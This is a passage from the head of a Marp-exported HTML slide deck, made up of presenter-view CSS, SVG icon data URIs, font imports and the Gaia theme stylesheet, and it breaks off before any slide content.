<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0"><meta name="apple-mobile-web-app-capable" content="yes"><meta http-equiv="X-UA-Compatible" content="ie=edge"><meta property="og:type" content="website"><meta name="twitter:card" content="summary"><style>@media screen{body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button{-webkit-tap-highlight-color:transparent;appearance:none;background-color:transparent;border:0;color:inherit;cursor:pointer;font-size:inherit;opacity:.8;outline:none;padding:0;transition:opacity .2s linear}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button:disabled,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button:disabled,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button:disabled,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button:disabled{cursor:not-allowed;opacity:.15!important}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button:hover,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button:hover,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button:hover,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button:hover{opacity:1}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button:hover:active,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button:hover:active,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button:hover:active,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button:hover:active{opacity:.6}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button:hover:not(:disabled),body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button:hover:not(:disabled),body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button:hover:not(:disabled),body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button:hover:not(:disabled){transition:none}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=prev],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=prev],body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button.bespoke-marp-presenter-info-page-prev{background:transparent url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cGF0aCBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSI1IiBkPSJNNjggOTAgMjggNTBsNDAtNDAiLz48L3N2Zz4=") no-repeat 50%;background-size:contain;overflow:hidden;text-indent:100%;white-space:nowrap}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=next],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=next],body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button.bespoke-marp-presenter-info-page-next{background:transparent url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cGF0aCBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSI1IiBkPSJtMzIgOTAgNDAtNDAtNDAtNDAiLz48L3N2Zz4=") no-repeat 50%;background-size:contain;overflow:hidden;text-indent:100%;white-space:nowrap}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=fullscreen],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=fullscreen]{background:transparent url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48ZGVmcz48c3R5bGU+LmF7ZmlsbDpub25lO3N0cm9rZTojZmZmO3N0cm9rZS1saW5lY2FwOnJvdW5kO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2Utd2lkdGg6NXB4fTwvc3R5bGU+PC9kZWZzPjxyZWN0IHdpZHRoPSI4MCIgaGVpZ2h0PSI2MCIgeD0iMTAiIHk9IjIwIiBjbGFzcz0iYSIgcng9IjUuNjciLz48cGF0aCBkPSJNNDAgNzBIMjBWNTBtMjAgMEwyMCA3MG00MC00MGgyMHYyMG0tMjAgMCAyMC0yMCIgY2xhc3M9ImEiLz48L3N2Zz4=") no-repeat 50%;background-size:contain;overflow:hidden;text-indent:100%;white-space:nowrap}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button.exit[data-bespoke-marp-osc=fullscreen],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button.exit[data-bespoke-marp-osc=fullscreen]{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48ZGVmcz48c3R5bGU+LmF7ZmlsbDpub25lO3N0cm9rZTojZmZmO3N0cm9rZS1saW5lY2FwOnJvdW5kO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2Utd2lkdGg6NXB4fTwvc3R5bGU+PC9kZWZzPjxyZWN0IHdpZHRoPSI4MCIgaGVpZ2h0PSI2MCIgeD0iMTAiIHk9IjIwIiBjbGFzcz0iYSIgcng9IjUuNjciLz48cGF0aCBkPSJNMjAgNTBoMjB2MjBtLTIwIDAgMjAtMjBtNDAgMEg2MFYzMG0yMCAwTDYwIDUwIiBjbGFzcz0iYSIvPjwvc3ZnPg==")}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=presenter],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=presenter]{background:transparent url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cGF0aCBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSI1IiBkPSJNODcuOCA0Ny41Qzg5IDUwIDg3LjcgNTIgODUgNTJIMzVhOC43IDguNyAwIDAgMS03LjItNC41bC0xNS42LTMxQzExIDE0IDEyLjIgMTIgMTUgMTJoNTBhOC44IDguOCAwIDAgMSA3LjIgNC41ek02MCA1MnYzNm0tMTAgMGgyME00NSA0MmgyMCIvPjwvc3ZnPg==") no-repeat 50%;background-size:contain;overflow:hidden;text-indent:100%;white-space:nowrap}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button.bespoke-marp-presenter-note-bigger{background:transparent url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cGF0aCBzdHJva2U9IiNmZmYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSI1IiBkPSJNMTIgNTBoODBNNTIgOTBWMTAiLz48L3N2Zz4=") no-repeat 50%;background-size:contain;overflow:hidden;text-indent:100%;white-space:nowrap}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button.bespoke-marp-presenter-note-smaller{background:transparent url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cGF0aCBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSI1IiBkPSJNMTIgNTBoODAiLz48L3N2Zz4=") no-repeat 50%;background-size:contain;overflow:hidden;text-indent:100%;white-space:nowrap}}@keyframes __bespoke_marp_transition_reduced_outgoing__{0%{opacity:1}to{opacity:0}}@keyframes __bespoke_marp_transition_reduced_incoming__{0%{mix-blend-mode:plus-lighter;opacity:0}to{mix-blend-mode:plus-lighter;opacity:1}}.bespoke-marp-note,.bespoke-marp-osc,.bespoke-progress-parent{display:none;transition:none}@media screen{::view-transition-group(*){animation-duration:var(--marp-bespoke-transition-animation-duration,.5s);animation-timing-function:ease}::view-transition-new(*),::view-transition-old(*){animation-delay:0s;animation-direction:var(--marp-bespoke-transition-animation-direction,normal);animation-duration:var(--marp-bespoke-transition-animation-duration,.5s);animation-fill-mode:both;animation-name:var(--marp-bespoke-transition-animation-name,var(--marp-bespoke-transition-animation-name-fallback,__bespoke_marp_transition_no_animation__));mix-blend-mode:normal}::view-transition-old(*){--marp-bespoke-transition-animation-name-fallback:__bespoke_marp_transition_reduced_outgoing__;animation-timing-function:ease}::view-transition-new(*){--marp-bespoke-transition-animation-name-fallback:__bespoke_marp_transition_reduced_incoming__;animation-timing-function:ease}::view-transition-new(root),::view-transition-old(root){animation-timing-function:linear}::view-transition-new(__bespoke_marp_transition_osc__),::view-transition-old(__bespoke_marp_transition_osc__){animation-duration:0s!important;animation-name:__bespoke_marp_transition_osc__!important}::view-transition-new(__bespoke_marp_transition_osc__){opacity:0!important}.bespoke-marp-transition-warming-up::view-transition-group(*),.bespoke-marp-transition-warming-up::view-transition-new(*),.bespoke-marp-transition-warming-up::view-transition-old(*){animation-play-state:paused!important}body,html{height:100%;margin:0}body{background:#000;overflow:hidden}svg.bespoke-marp-slide{content-visibility:hidden;opacity:0;pointer-events:none;z-index:-1}svg.bespoke-marp-slide:not(.bespoke-marp-active) *{view-transition-name:none!important}svg.bespoke-marp-slide.bespoke-marp-active{content-visibility:visible;opacity:1;pointer-events:auto;z-index:0}svg.bespoke-marp-slide.bespoke-marp-active.bespoke-marp-active-ready *{animation-name:__bespoke_marp__!important}@supports not (content-visibility:hidden){svg.bespoke-marp-slide[data-bespoke-marp-load=hideable]{display:none}svg.bespoke-marp-slide[data-bespoke-marp-load=hideable].bespoke-marp-active{display:block}}}@media screen and (prefers-reduced-motion:reduce){svg.bespoke-marp-slide *{view-transition-name:none!important}}@media screen{[data-bespoke-marp-fragment=inactive]{visibility:hidden}body[data-bespoke-view=""] .bespoke-marp-parent,body[data-bespoke-view=next] .bespoke-marp-parent{inset:0;position:absolute}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc{view-transition-name:__bespoke_marp_transition_osc__;background:rgba(0,0,0,.65);border-radius:7px;bottom:50px;color:#fff;contain:paint;display:block;font-family:Helvetica,Arial,sans-serif;font-size:16px;left:50%;line-height:0;opacity:1;padding:12px;position:absolute;touch-action:manipulation;transform:translateX(-50%);transition:opacity .2s linear;-webkit-user-select:none;user-select:none;white-space:nowrap;will-change:transform;z-index:1}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>*,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>*{margin-left:6px}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>:first-child,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>:first-child{margin-left:0}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>span,body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>span{opacity:.8}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>span[data-bespoke-marp-osc=page],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>span[data-bespoke-marp-osc=page]{display:inline-block;min-width:140px;text-align:center}body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=fullscreen],body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=next],body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=presenter],body[data-bespoke-view=""] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=prev],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=fullscreen],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=next],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=presenter],body[data-bespoke-view=next] .bespoke-marp-parent>.bespoke-marp-osc>button[data-bespoke-marp-osc=prev]{height:32px;line-height:32px;width:32px}body[data-bespoke-view=""] .bespoke-marp-parent.bespoke-marp-inactive,body[data-bespoke-view=next] .bespoke-marp-parent.bespoke-marp-inactive{cursor:none}body[data-bespoke-view=""] .bespoke-marp-parent.bespoke-marp-inactive>.bespoke-marp-osc,body[data-bespoke-view=next] .bespoke-marp-parent.bespoke-marp-inactive>.bespoke-marp-osc{opacity:0;pointer-events:none}body[data-bespoke-view=""] svg.bespoke-marp-slide,body[data-bespoke-view=next] svg.bespoke-marp-slide{height:100%;left:0;position:absolute;top:0;width:100%}body[data-bespoke-view=""] .bespoke-progress-parent{background:#222;display:flex;height:5px;width:100%}body[data-bespoke-view=""] .bespoke-progress-parent+.bespoke-marp-parent{top:5px}body[data-bespoke-view=""] .bespoke-progress-parent .bespoke-progress-bar{background:#0288d1;flex:0 0 0;transition:flex-basis .2s cubic-bezier(0,1,1,1)}body[data-bespoke-view=next]{background:transparent}body[data-bespoke-view=presenter]{background:#161616}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container{display:grid;font-family:Helvetica,Arial,sans-serif;grid-template:"current dragbar next" minmax(140px,1fr) "current dragbar note" 2fr "info    dragbar note" 3em;grid-template-columns:minmax(3px,var(--bespoke-marp-presenter-split-ratio,66%)) 0 minmax(3px,1fr);height:100%;left:0;position:absolute;top:0;width:100%}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-parent{grid-area:current;overflow:hidden;position:relative}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-parent svg.bespoke-marp-slide{height:calc(100% - 40px);left:20px;pointer-events:none;position:absolute;top:20px;-webkit-user-select:none;user-select:none;width:calc(100% - 40px)}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-parent svg.bespoke-marp-slide.bespoke-marp-active{filter:drop-shadow(0 3px 10px rgba(0,0,0,.5))}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-dragbar-container{background:#0288d1;cursor:col-resize;grid-area:dragbar;margin-left:-3px;opacity:0;position:relative;transition:opacity .4s linear .1s;width:6px;z-index:10}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-dragbar-container:hover{opacity:1}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-dragbar-container.active{opacity:1;transition-delay:0s}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-next-container{background:#222;cursor:pointer;display:none;grid-area:next;overflow:hidden;position:relative}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-next-container.active{display:block}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-next-container iframe.bespoke-marp-presenter-next{background:transparent;border:0;display:block;filter:drop-shadow(0 3px 10px rgba(0,0,0,.5));height:calc(100% - 40px);left:20px;pointer-events:none;position:absolute;top:20px;-webkit-user-select:none;user-select:none;width:calc(100% - 40px)}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container{background:#222;color:#eee;grid-area:note;position:relative;z-index:1}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container button{height:1.5em;line-height:1.5em;width:1.5em}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-presenter-note-wrapper{display:block;inset:0;position:absolute}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-presenter-note-buttons{background:rgba(0,0,0,.65);border-radius:4px;bottom:0;display:flex;gap:4px;margin:12px;opacity:0;padding:6px;pointer-events:none;position:absolute;right:0;transition:opacity .2s linear}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-presenter-note-buttons:focus-within,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-presenter-note-wrapper:focus-within+.bespoke-marp-presenter-note-buttons,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container:hover .bespoke-marp-presenter-note-buttons{opacity:1;pointer-events:auto}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note{word-wrap:break-word;box-sizing:border-box;font-size:calc(1.1em*var(--bespoke-marp-note-font-scale, 1));height:calc(100% - 40px);margin:20px;overflow:auto;padding-right:3px;scrollbar-color:hsla(0,0%,93%,.5) transparent;scrollbar-width:thin;white-space:pre-wrap;width:calc(100% - 40px)}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note::-webkit-scrollbar{width:6px}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note::-webkit-scrollbar-track{background:transparent}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note::-webkit-scrollbar-thumb{background:hsla(0,0%,93%,.5);border-radius:6px}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note:empty{pointer-events:none}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note.active{display:block}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note p:first-child{margin-top:0}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-note-container .bespoke-marp-note p:last-child{margin-bottom:0}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container{align-items:center;box-sizing:border-box;color:#eee;display:flex;flex-wrap:nowrap;grid-area:info;justify-content:center;overflow:hidden;padding:0 10px}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-page,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-time,body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-timer{box-sizing:border-box;display:block;padding:0 10px;white-space:nowrap;width:100%}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container button{height:1.5em;line-height:1.5em;width:1.5em}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-page{order:2;text-align:center}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-page .bespoke-marp-presenter-info-page-text{display:inline-block;min-width:120px;text-align:center}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-time{color:#999;order:1;text-align:left}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-timer{color:#999;order:3;text-align:right}body[data-bespoke-view=presenter] .bespoke-marp-presenter-container .bespoke-marp-presenter-info-container .bespoke-marp-presenter-info-timer:hover{cursor:pointer}}@media print{.bespoke-marp-presenter-info-container,.bespoke-marp-presenter-next-container,.bespoke-marp-presenter-note-container{display:none}}</style><style>@charset "UTF-8";@import "https://fonts.bunny.net/css?family=Lato:400,900|Roboto+Mono:400,700&display=swap";@import url('https://fonts.googleapis.com/css?family=Inter:400,500,700');div#\:\$p>svg>foreignObject>section{width:1280px;height:720px;box-sizing:border-box;overflow:hidden;position:relative;scroll-snap-align:center center}div#\:\$p>svg>foreignObject>section:after{bottom:0;content:attr(data-marpit-pagination);padding:inherit;pointer-events:none;position:absolute;right:0}div#\:\$p>svg>foreignObject>section:not([data-marpit-pagination]):after{display:none}/* Normalization */div#\:\$p>svg>foreignObject>section :is(h1,marp-h1){font-size:2em;margin:0.67em 0}div#\:\$p>svg>foreignObject>section video::-webkit-media-controls{will-change:transform}@page{size:1280px 720px;margin:0}@media print{body,html{background-color:#fff;margin:0;page-break-inside:avoid;break-inside:avoid-page}div#\:\$p>svg>foreignObject>section{page-break-before:always;break-before:page}div#\:\$p>svg>foreignObject>section,div#\:\$p>svg>foreignObject>section *{-webkit-print-color-adjust:exact!important;animation-delay:0s!important;animation-duration:0s!important;color-adjust:exact!important;transition:none!important}div#\:\$p>svg[data-marpit-svg]{display:block;height:100vh;width:100vw}}
/*!
 * Marp / Marpit Gaia theme.
 *
 * @theme gaia
 * @author Yuki Hattori
 *
 * @auto-scaling true
 * @size 16:9 1280px 720px
 * @size 4:3 960px 720px
 */div#\:\$p>svg>foreignObject>section :is(pre,marp-pre) code.hljs{display:block;overflow-x:auto;padding:1em}div#\:\$p>svg>foreignObject>section code.hljs{padding:3px 5px}div#\:\$p>svg>foreignObject>section .hljs{background:#000;color:#f8f8f8}div#\:\$p>svg>foreignObject>section .hljs-comment,div#\:\$p>svg>foreignObject>section .hljs-quote{color:#aeaeae;font-style:italic}div#\:\$p>svg>foreignObject>section .hljs-keyword,div#\:\$p>svg>foreignObject>section .hljs-selector-tag,div#\:\$p>svg>foreignObject>section .hljs-type{color:#e28964}div#\:\$p>svg>foreignObject>section .hljs-string{color:#65b042}div#\:\$p>svg>foreignObject>section .hljs-subst{color:#daefa3}div#\:\$p>svg>foreignObject>section .hljs-link,div#\:\$p>svg>foreignObject>section .hljs-regexp{color:#e9c062}div#\:\$p>svg>foreignObject>section .hljs-name,div#\:\$p>svg>foreignObject>section .hljs-section,div#\:\$p>svg>foreignObject>section .hljs-tag,div#\:\$p>svg>foreignObject>section .hljs-title{color:#89bdff}div#\:\$p>svg>foreignObject>section .hljs-class .hljs-title,div#\:\$p>svg>foreignObject>section .hljs-doctag,div#\:\$p>svg>foreignObject>section .hljs-title.class_{text-decoration:underline}div#\:\$p>svg>foreignObject>section .hljs-bullet,div#\:\$p>svg>foreignObject>section .hljs-number,div#\:\$p>svg>foreignObject>section .hljs-symbol{color:#3387cc}div#\:\$p>svg>foreignObject>section .hljs-params,div#\:\$p>svg>foreignObject>section .hljs-template-variable,div#\:\$p>svg>foreignObject>section .hljs-variable{color:#3e87e3}div#\:\$p>svg>foreignObject>section .hljs-attribute{color:#cda869}div#\:\$p>svg>foreignObject>section .hljs-meta{color:#8996a8}div#\:\$p>svg>foreignObject>section .hljs-formula{background-color:#0e2231;color:#f8f8f8;font-style:italic}div#\:\$p>svg>foreignObject>section .hljs-addition{background-color:#253b22;color:#f8f8f8}div#\:\$p>svg>foreignObject>section .hljs-deletion{background-color:#420e09;color:#f8f8f8}div#\:\$p>svg>foreignObject>section .hljs-selector-class{color:#9b703f}div#\:\$p>svg>foreignObject>section .hljs-selector-id{color:#8b98ab}div#\:\$p>svg>foreignObject>section .hljs-emphasis{font-style:italic}div#\:\$p>svg>foreignObject>section .hljs-strong{font-weight:700}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1),div#\:\$p>svg>foreignObject>section :is(h2,marp-h2),div#\:\$p>svg>foreignObject>section :is(h3,marp-h3),div#\:\$p>svg>foreignObject>section :is(h4,marp-h4),div#\:\$p>svg>foreignObject>section :is(h5,marp-h5),div#\:\$p>svg>foreignObject>section :is(h6,marp-h6){margin:.5em 0 0}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1) strong,div#\:\$p>svg>foreignObject>section :is(h2,marp-h2) strong,div#\:\$p>svg>foreignObject>section :is(h3,marp-h3) strong,div#\:\$p>svg>foreignObject>section :is(h4,marp-h4) strong,div#\:\$p>svg>foreignObject>section :is(h5,marp-h5) strong,div#\:\$p>svg>foreignObject>section :is(h6,marp-h6) strong{font-weight:inherit}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1)::part(auto-scaling),div#\:\$p>svg>foreignObject>section :is(h2,marp-h2)::part(auto-scaling),div#\:\$p>svg>foreignObject>section :is(h3,marp-h3)::part(auto-scaling),div#\:\$p>svg>foreignObject>section :is(h4,marp-h4)::part(auto-scaling),div#\:\$p>svg>foreignObject>section :is(h5,marp-h5)::part(auto-scaling),div#\:\$p>svg>foreignObject>section :is(h6,marp-h6)::part(auto-scaling){max-height:580px}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1){font-size:1.8em}div#\:\$p>svg>foreignObject>section :is(h2,marp-h2){font-size:1.5em}div#\:\$p>svg>foreignObject>section :is(h3,marp-h3){font-size:1.3em}div#\:\$p>svg>foreignObject>section :is(h4,marp-h4){font-size:1.1em}div#\:\$p>svg>foreignObject>section :is(h5,marp-h5){font-size:1em}div#\:\$p>svg>foreignObject>section :is(h6,marp-h6){font-size:.9em}div#\:\$p>svg>foreignObject>section blockquote,div#\:\$p>svg>foreignObject>section p{margin:1em 0 0}div#\:\$p>svg>foreignObject>section ol>li,div#\:\$p>svg>foreignObject>section ul>li{margin:.3em 0 0}div#\:\$p>svg>foreignObject>section ol>li>p,div#\:\$p>svg>foreignObject>section ul>li>p{margin:.6em 0 0}div#\:\$p>svg>foreignObject>section code{display:inline-block;font-family:Roboto Mono,monospace;font-size:.8em;letter-spacing:0;margin:-.1em .15em;padding:.1em .2em;vertical-align:baseline}div#\:\$p>svg>foreignObject>section :is(pre,marp-pre){display:block;margin:1em 0 0;overflow:visible}div#\:\$p>svg>foreignObject>section :is(pre,marp-pre) code{box-sizing:border-box;font-size:.7em;margin:0;min-width:100%;padding:.5em}div#\:\$p>svg>foreignObject>section :is(pre,marp-pre)::part(auto-scaling){max-height:calc(580px - 1em)}div#\:\$p>svg>foreignObject>section blockquote{margin:1em 0 0;padding:0 1em;position:relative}div#\:\$p>svg>foreignObject>section blockquote:after,div#\:\$p>svg>foreignObject>section blockquote:before{content:"“";display:block;font-family:Times New Roman,serif;font-weight:700;position:absolute}div#\:\$p>svg>foreignObject>section blockquote:before{left:0;top:0}div#\:\$p>svg>foreignObject>section blockquote:after{bottom:0;right:0;transform:rotate(180deg)}div#\:\$p>svg>foreignObject>section blockquote>:first-child{margin-top:0}div#\:\$p>svg>foreignObject>section mark{background:transparent}div#\:\$p>svg>foreignObject>section table{border-collapse:collapse;border-spacing:0;margin:1em 0 0}div#\:\$p>svg>foreignObject>section table td,div#\:\$p>svg>foreignObject>section table th{border-style:solid;border-width:1px;padding:.2em .4em}div#\:\$p>svg>foreignObject>section footer,div#\:\$p>svg>foreignObject>section header,div#\:\$p>svg>foreignObject>section:after{box-sizing:border-box;font-size:66%;height:70px;line-height:50px;overflow:hidden;padding:10px 25px;position:absolute}div#\:\$p>svg>foreignObject>section:after{--marpit-root-font-size:66%}div#\:\$p>svg>foreignObject>section header{top:0}div#\:\$p>svg>foreignObject>section footer,div#\:\$p>svg>foreignObject>section header{left:0;right:0}div#\:\$p>svg>foreignObject>section footer{bottom:0}div#\:\$p>svg>foreignObject>section{word-wrap:break-word;--color-background:#fff8e1;--color-background-stripe:rgba(69,90,100,.1);--color-foreground:#455a64;--color-dimmed:#6a7a7d;--color-highlight:#0288d1;background-color:var(--color-background);background-image:linear-gradient(135deg,hsla(0,0%,53%,0),hsla(0,0%,53%,.02) 50%,hsla(0,0%,100%,0) 0,hsla(0,0%,100%,.05));color:var(--color-foreground);font-family:Lato,Avenir Next,Avenir,Trebuchet MS,Segoe UI,sans-serif;font-size:35px;height:720px;letter-spacing:1.25px;line-height:1.35;padding:70px;width:1280px}div#\:\$p>svg>foreignObject>section{--marpit-root-font-size:35px}div#\:\$p>svg>foreignObject>section:after{bottom:0;font-size:80%;right:0}div#\:\$p>svg>foreignObject>section:after{--marpit-root-font-size:80%}div#\:\$p>svg>foreignObject>section a,div#\:\$p>svg>foreignObject>section mark{color:var(--color-highlight)}div#\:\$p>svg>foreignObject>section code{background:var(--color-dimmed);color:var(--color-background)}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1) strong,div#\:\$p>svg>foreignObject>section :is(h2,marp-h2) strong,div#\:\$p>svg>foreignObject>section :is(h3,marp-h3) 